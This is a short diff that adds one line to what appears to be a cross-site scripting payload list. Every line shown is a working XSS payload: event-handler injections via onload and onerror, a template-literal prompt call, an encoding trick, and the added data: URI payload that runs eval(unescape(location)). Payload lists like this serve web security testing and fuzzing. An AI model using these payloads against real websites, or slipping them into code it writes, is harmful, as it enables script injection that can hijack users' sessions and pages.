@@ -1420,3 +1420,4 @@ a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
 <svg%0donload=alert(0)>
 <body onload=```${prompt``}`>
 <iframe src="http://target" referrerpolicy="no-referrer">
+data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
